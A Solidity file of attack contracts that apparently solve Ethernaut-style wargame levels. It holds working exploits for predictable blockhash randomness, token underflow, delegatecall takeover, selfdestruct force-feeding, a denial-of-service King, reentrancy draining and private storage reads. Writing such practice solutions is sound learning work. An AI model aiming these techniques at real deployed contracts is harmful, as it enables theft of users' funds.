// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;



contract CoinFlipSolution {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address target) public {
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip = blockValue/FACTOR;
        bool side = coinFlip == 1 ? true : false;
        CoinFlip(target).flip(side);
    }

}

interface CoinFlip {
    function flip(bool) external returns (bool);
}

interface Telephone {
    function changeOwner(address) external;
}

contract TelephoneSolution {

    function attackTelephone(address newOwner, address targetContract) public {

        Telephone(targetContract).changeOwner(newOwner);

    }
}

interface token {
    function transfer(address, uint256) external;
}

contract tokenAttack {

    function attack(address targetContract, address to) public {
        token(targetContract).transfer(to, 2**256-21);
    }

}

contract DelegateAttacker {

    address delegationContract = 0x25bEE23e489b9ec351A3f974c3050D1be60900FE;

    function attack() public returns (bool) {
        (bool result, ) = delegationContract.call(abi.encode(bytes4(keccak256("pwn()"))));
        return result;
    }
}

contract ForceAttacker {

    function attack(address targetContractAddress) public {
        selfdestruct(payable(targetContractAddress));
    }

    receive() external payable { }

}

contract KingAttacker {
    function attack(address targetContract) payable public {
        (bool result, ) = payable(targetContract).call{value:msg.value}("");
        require(result, "Add more funds, kingship claim unsuccessful");

    }

    receive() external payable { 
        revert("No more kings");
    }
}


 interface Reentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
 }


 contract ReentrancyAttacker {

    Reentrancy contractReentrancy;

    constructor(address _targetContract) {
        contractReentrancy = Reentrancy(_targetContract);
    }

    function getEth() public payable {

    }
    function donate() public payable {
        contractReentrancy.donate{value: 1 ether}(address(this));

    }
    function attack(uint256 amount) public {
        contractReentrancy.withdraw(amount);
    }

    receive() external payable {
        if (address(contractReentrancy).balance >= 0){
            contractReentrancy.withdraw(1 ether);
        }
    }
 }

 interface Elevator {
    function goTo(uint256) external;
 }


 contract Building {
    bool public toggle = true;
    function isLastFloor(uint256) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack(address targetContract) public {

        Elevator(targetContract).goTo(0);

    }
 }

 interface Privacy {
    function unlock(bytes16) external;
 }

 contract PrivacyAttacker {

    function attack(address targetContract, bytes32 key) public {

        bytes16 key16 = bytes16(key);

        Privacy(targetContract).unlock(key16);

    }
 }